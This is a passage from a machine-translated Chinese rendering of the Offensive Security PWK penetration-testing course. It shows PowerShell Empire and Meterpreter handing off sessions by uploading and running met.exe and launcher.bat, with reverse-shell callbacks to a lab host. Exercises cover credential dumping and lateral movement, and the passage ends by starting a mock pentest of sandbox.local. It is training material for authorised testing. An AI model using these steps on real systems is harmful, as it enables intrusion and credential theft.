<div style="position:absolute;top:148243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 特工 S2Y5XW1L 的任务是任务 ID 3</font></font></nobr></div>
<div style="position:absolute;top:148260;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 特工 S2Y5XW1L 返回结果。</font></font></nobr></div>
<div style="position:absolute;top:148277;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录：</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec.corp\Downloads&gt;</font></font></font></b></nobr></div>
<div style="position:absolute;top:148328;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模式    </font></font></nobr></div>
<div style="position:absolute;top:148328;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上次写入时间    </font></font></nobr></div>
<div style="position:absolute;top:148328;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">长度名称    </font></font></nobr></div>
<div style="position:absolute;top:148345;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:148345;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------    </font></font></nobr></div>
<div style="position:absolute;top:148345;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------ ----  </font></font></nobr></div>
<div style="position:absolute;top:148362;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-一种 -  -    </font></font></nobr></div>
<div style="position:absolute;top:148362;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10/2/2019 上午 11:24    </font></font></nobr></div>
<div style="position:absolute;top:148362;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">73802</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">遇见.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:148396;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">..命令执行完成。</font></font></nobr></div>
<div style="position:absolute;top:148413;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 10.11.0.22 返回的有效结果 </font></font></nobr></div>
<div style="position:absolute;top:148432;left:314"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 849 - 上传 Meterpreter 可执行文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:148462;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上传可执行文件后，我们发出</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dir</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> shell 命令（清单 849）以显示其位置</font></font></nobr></div>
<div style="position:absolute;top:148481;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并执行它：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:148516;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: S2Y5XW1L) &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shell C:\Users\offsec.corp\Downloads&gt;met.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:148533;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 委托 S2Y5XW1L 运行 TASK_SHELL</font></font></nobr></div>
<div style="position:absolute;top:148550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 代理 S2Y5XW1L 的任务是任务 ID 5 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:148675;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="126"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 126 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:148708;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:149785;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:149785;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:149785;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">743</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:148804;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 特工 S2Y5XW1L 返回结果。</font></font></nobr></div>
<div style="position:absolute;top:148820;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">..</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令执行完成。</font></font></font></b></nobr></div>
<div style="position:absolute;top:148837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 10.11.0.22 返回的有效结果 </font></font></nobr></div>
<div style="position:absolute;top:148857;left:315"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 850 - 执行 meterpreter 可执行文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:148886;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随着可执行文件的运行，我们将切换回我们的 Meterpreter 侦听器并观察传入的</font></font></nobr></div>
<div style="position:absolute;top:148906;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">壳：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:148940;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 http://10.11.0.4:7777 上启动 HTTP 反向处理程序</font></font></nobr></div>
<div style="position:absolute;top:148957;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] http://10.11.0.4:7777 处理来自 10.11.0.22 的请求；</font><font style="vertical-align: inherit;">暂存 x86 有效负载 (18082</font></font></nobr></div>
<div style="position:absolute;top:148975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter 会话 1 打开</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(10.11.0.4:7777 -&gt; 10.11.0.22:50597)</font></font></nobr></div>
<div style="position:absolute;top:149008;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter&gt;</font></font></nobr></div>
<div style="position:absolute;top:149028;left:363"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 851 - Meterpreter 回调</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:149057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反转这个过程以从现有的 Meterpreter 会话连接到 Empire 代理也是</font></font></nobr></div>
<div style="position:absolute;top:149076;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">简单的。</font><font style="vertical-align: inherit;">我们可以创建一个启动器（.bat 格式）并使用meterpreter 上传并执行它。</font><font style="vertical-align: inherit;">第一的</font></font></nobr></div>
<div style="position:absolute;top:149096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用 Empire 创建启动器：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:149130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: listeners) &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">usestager windows/launcher_bat</font></font></font></b></nobr></div>
<div style="position:absolute;top:149165;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: stager/windows/launcher_bat) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置监听器 http</font></font></font></b></nobr></div>
<div style="position:absolute;top:149198;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：stager/windows/launcher_bat）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行</font></font></font></b></nobr></div>
<div style="position:absolute;top:149232;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] Stager 输出写到：/tmp/launcher.bat</font></font></nobr></div>
<div style="position:absolute;top:149252;left:361"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 852 - 创建启动器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:149282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后我们可以上传并执行它：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:149316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上传/tmp/launcher.bat</font></font></font></b></nobr></div>
<div style="position:absolute;top:149333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 上传：/tmp/launcher.bat -&gt; launcher.bat</font></font></nobr></div>
<div style="position:absolute;top:149350;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 上传 4.69 KiB 的 4.69 KiB (100.0%)：/tmp/launcher.bat -&gt; launcher.bat</font></font></nobr></div>
<div style="position:absolute;top:149367;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 上传：/tmp/launcher.bat -&gt; launcher.bat</font></font></nobr></div>
<div style="position:absolute;top:149401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳</font></font></font></b></nobr></div>
<div style="position:absolute;top:149418;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程 4644 已创建。</font></font></nobr></div>
<div style="position:absolute;top:149435;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">频道 2 已创建。</font></font></nobr></div>
<div style="position:absolute;top:149469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec.corp\Downloads&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录</font></font></font></b></nobr></div>
<div style="position:absolute;top:149486;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录</font></font></nobr></div>
<div style="position:absolute;top:149503;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">驱动器 C 中的卷没有标签。</font></font></nobr></div>
<div style="position:absolute;top:149520;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卷序列号为 9E6A-47F8</font></font></nobr></div>
<div style="position:absolute;top:149554;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec.corp\Downloads 目录</font></font></nobr></div>
<div style="position:absolute;top:149588;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">09/19/2019 08:42 AM &lt;DIR&gt;    </font></font></nobr></div>
<div style="position:absolute;top:149588;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></nobr></div>
<div style="position:absolute;top:149605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">09/19/2019 08:42 AM &lt;DIR&gt;    </font></font></nobr></div>
<div style="position:absolute;top:149605;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">..</font></font></nobr></div>
<div style="position:absolute;top:149621;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">09/19/2019 上午 08:42    </font></font></nobr></div>
<div style="position:absolute;top:149621;left:376"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4,802</font><b><font color="#c00000"><font style="vertical-align: inherit;">启动器</font></font></b><font style="vertical-align: inherit;">.bat</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
<div style="position:absolute;top:149638;left:230"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 个文件    </font></font></nobr></div>
<div style="position:absolute;top:149638;left:376"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4,802 字节</font></font></nobr></div>
<div style="position:absolute;top:149655;left:230"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2 目录 2,022,359,040 字节空闲</font></font></nobr></div>
<div style="position:absolute;top:149689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec.corp\Downloads&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">launcher.bat</font></font></font></b></nobr></div>
<div style="position:absolute;top:149706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动器.bat</font></font></nobr></div>
<div style="position:absolute;top:149726;left:290"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 853 - 上传和执行启动器负载 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:149863;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="127"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 127 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:149896;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:150973;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:150973;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:150973;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">744</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:149992;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们应该从受感染的主机接收到一个 Empire 代理：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:150027;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：特工）&gt; [+] 10.11.0.22 的初始特工 LEBYRW67 现在处于活动状态（Slack）</font></font></nobr></div>
<div style="position:absolute;top:150046;left:319"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 854 - 接收 Empire 代理回调</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:150075;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用这些技术，我们可以在同一个受感染的框架上利用这两个框架</font></font></nobr></div>
<div style="position:absolute;top:150095;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主持人。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:150129;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.3.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:150159;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 设置 PowerShell Empire 侦听器和 stager 并获取工作代理。</font></font></nobr></div>
<div style="position:absolute;top:150188;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 使用各种模块对域进行枚举。</font></font></nobr></div>
<div style="position:absolute;top:150216;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 使用帐户 Jeff_Admin 执行远程桌面登录，以确保凭据正确</font></font></nobr></div>
<div style="position:absolute;top:150235;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓存在 Windows 10 客户端上，然后使用 PowerShell Empire 转储凭据。</font></font></nobr></div>
<div style="position:absolute;top:150264;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 试验不同的横向运动模块。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:150301;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.4 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:150342;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们介绍了 PowerShell Empire 的基本语法和功能，例如</font></font></nobr></div>
<div style="position:absolute;top:150362;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听众、舞台表演者和代理人。</font><font style="vertical-align: inherit;">我们还探索了各种模块来执行枚举，获得</font></font></nobr></div>
<div style="position:absolute;top:150381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">凭证，并执行横向移动。</font><font style="vertical-align: inherit;">最后，我们研究了 PowerShell Empire 和</font></font></nobr></div>
<div style="position:absolute;top:150400;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 可以一起使用。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:151051;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="128"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 128 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:151084;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:152161;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:152161;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:152161;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">745</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:151174;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.4.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:151200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24. 组装零件：渗透测试分解</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:151244;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经介绍了渗透测试的所有单独部分，是时候把它们放在</font></font></nobr></div>
<div style="position:absolute;top:151264;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一起。</font><font style="vertical-align: inherit;">在本模块中，我们将进行受现实世界启发的模拟渗透测试</font></font></nobr></div>
<div style="position:absolute;top:151283;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发现。</font></font></nobr></div>
<div style="position:absolute;top:151316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然我们在本练习中的目标是获得环境中的域管理员访问权限，但它</font></font></nobr></div>
<div style="position:absolute;top:151335;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要注意的是，这并不总是渗透测试的最终目标。</font><font style="vertical-align: inherit;">我们的目标应该是</font></font></nobr></div>
<div style="position:absolute;top:151354;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由客户的数据基础设施和商业模式决定。</font><font style="vertical-align: inherit;">例如，如果客户端的主</font></font></nobr></div>
<div style="position:absolute;top:151374;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">业务是仓储数据，我们的目标是获取这些数据。</font><font style="vertical-align: inherit;">那是因为违反</font></font></nobr></div>
<div style="position:absolute;top:151393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这种性质将对客户造成最重大的影响。</font><font style="vertical-align: inherit;">大多数情况下，域</font></font></nobr></div>
<div style="position:absolute;top:151413;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理员访问将帮助我们实现该目标，但情况并非总是如此。</font></font></nobr></div>
<div style="position:absolute;top:151445;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个渗透测试中，我们将在枚举和利用之间来回切换。</font></font></nobr></div>
<div style="position:absolute;top:151465;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将在枚举阶段花费一些时间以确保我们使用的方法</font></font></nobr></div>
<div style="position:absolute;top:151484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为剥削是好的。</font><font style="vertical-align: inherit;">我们还将回顾一些容易犯的错误并讨论原因</font></font></nobr></div>
<div style="position:absolute;top:151503;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在目标上获取 root/admin 并不总是必要的。</font></font></nobr></div>
<div style="position:absolute;top:151536;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的虚构客户为我们提供了一个名为“sandbox.local”的初始目标，并提到</font></font></nobr></div>
<div style="position:absolute;top:151556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">受损的域管理员帐户将对他们的业务产生最大的影响。</font></font></nobr></div>
<div style="position:absolute;top:151575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">沙盒网络可通过实验室 VPN 访问，其网络布局如图 317 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:151728;left:346"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 317：目标网络概览</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:151786;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该域可通过 PWK VPN 访问，但需要我们向我们的</font></font></i></nobr></div>
<div style="position:absolute;top:151805;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/hosts 文件。</font><font style="vertical-align: inherit;">首先，我们将通过复制来备份现有文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:151825;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/hosts</font></font><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到</font></font></font><font style="vertical-align: inherit;"><font color="#0070c0"><font style="vertical-align: inherit;">我们主目录中的</font></font><font style="vertical-align: inherit;">hosts.orig </font></font><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">现在我们将附加一个条目</font></font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:151844;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将允许我们通过运行</font></font></i><font style="vertical-align: inherit;"><b><font color="#000000" style="font-size:13px"><font style="vertical-align: inherit;">sudo bash -c</font></font></b><i><font style="vertical-align: inherit;">通过其 DNS 名称联系域</font></i></font><b><font color="#000000" style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:151863;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">" echo '10.11.1.250 sandbox.local' &gt;&gt; /etc/hosts" </font></font></b><i><font color="#0070c0" style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">有了那套，我们</font></font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:151883;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以继续。</font></font></i></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:151945;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.1 公网枚举</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:151987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将首先对可通过 DNS 名称解析的外部主机进行扫描</font></font></nobr></div>
<div style="position:absolute;top:152006;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">沙盒.本地。</font><font style="vertical-align: inherit;">为此，我们将使用 Nmap 和以下命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:152041;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nmap -sC -sS -p0-65535 sandbox.local</font></font></font></b></nobr></div>
<div style="position:absolute;top:152061;left:318"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 855 - 用于初始发现的 Nmap 命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:152090;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 855 中的命令将使用 Nmap 的默认脚本集 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-sC</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )，使用 SYN 扫描更快</font></font></nobr></div>
<div style="position:absolute;top:152109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行时 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-sS</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )，扫描所有端口 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p0-65535</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )，并且只针对 sandbox.local 网络。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:152239;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="129"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 129 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:152272;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:153349;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:153349;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:153349;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">746</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:152368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 扫描结果可以在清单 856 中找到。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:152402;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sandbox.local (10.11.1.250) 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:152420;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.00060 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:152437;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未显示：65534 个过滤端口</font></font></nobr></div>
